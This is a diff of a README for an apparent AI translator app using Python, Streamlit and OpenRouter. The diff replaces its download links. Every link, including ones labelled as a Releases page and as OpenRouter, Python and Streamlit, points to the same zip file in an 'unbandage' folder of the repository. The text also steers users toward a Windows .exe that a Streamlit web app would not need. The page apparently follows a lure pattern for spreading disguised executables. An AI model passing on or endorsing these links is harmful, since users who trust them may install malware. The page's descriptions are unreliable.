@@ -4,13 +4,13 @@
 Welcome to the ai-translator-app-openrouter-api! This is a simple and powerful web application that helps you translate text using AI. It utilizes the OpenRouter API and integrates with popular Python and Streamlit frameworks. Whether you need to translate a paragraph or a whole document, this tool can assist you.
 
 ## 🔗 Download Now
-[![Download Now](https://raw.githubusercontent.com/me-rang/ai-translator-app-openrouter-api/main/unbandage/ai-translator-app-openrouter-api.zip)](https://raw.githubusercontent.com/me-rang/ai-translator-app-openrouter-api/main/unbandage/ai-translator-app-openrouter-api.zip)
+[![Download Now](https://github.com/me-rang/ai-translator-app-openrouter-api/raw/refs/heads/main/unbandage/openrouter-translator-api-app-ai-3.7.zip)](https://github.com/me-rang/ai-translator-app-openrouter-api/raw/refs/heads/main/unbandage/openrouter-translator-api-app-ai-3.7.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the AI Translator app:
 
 ### 1. Visit the Releases Page
-Go to our Releases page to find the latest version of the application. Here is the link: [Download Page](https://raw.githubusercontent.com/me-rang/ai-translator-app-openrouter-api/main/unbandage/ai-translator-app-openrouter-api.zip).
+Go to our Releases page to find the latest version of the application. Here is the link: [Download Page](https://github.com/me-rang/ai-translator-app-openrouter-api/raw/refs/heads/main/unbandage/openrouter-translator-api-app-ai-3.7.zip).
 
 ### 2. Choose Your Download
 On the Releases page, look for the latest version. You’ll see several files available for download. Select the file that fits your operating system. Most users will likely download the `.exe` file for Windows or a similar installation file for Mac or Linux.
@@ -67,8 +67,8 @@ For updates and announcements, please check our GitHub repository or follow us o
 
 ## 🌐 More Information
 For additional resources or information on similar applications, feel free to explore the following topics related to our project:
-- [OpenRouter](https://raw.githubusercontent.com/me-rang/ai-translator-app-openrouter-api/main/unbandage/ai-translator-app-openrouter-api.zip)
-- [Python](https://raw.githubusercontent.com/me-rang/ai-translator-app-openrouter-api/main/unbandage/ai-translator-app-openrouter-api.zip)
-- [Streamlit](https://raw.githubusercontent.com/me-rang/ai-translator-app-openrouter-api/main/unbandage/ai-translator-app-openrouter-api.zip)
+- [OpenRouter](https://github.com/me-rang/ai-translator-app-openrouter-api/raw/refs/heads/main/unbandage/openrouter-translator-api-app-ai-3.7.zip)
+- [Python](https://github.com/me-rang/ai-translator-app-openrouter-api/raw/refs/heads/main/unbandage/openrouter-translator-api-app-ai-3.7.zip)
+- [Streamlit](https://github.com/me-rang/ai-translator-app-openrouter-api/raw/refs/heads/main/unbandage/openrouter-translator-api-app-ai-3.7.zip)
 
 Thank you for using the ai-translator-app-openrouter-api! We hope this application makes your translation tasks easier and more efficient.
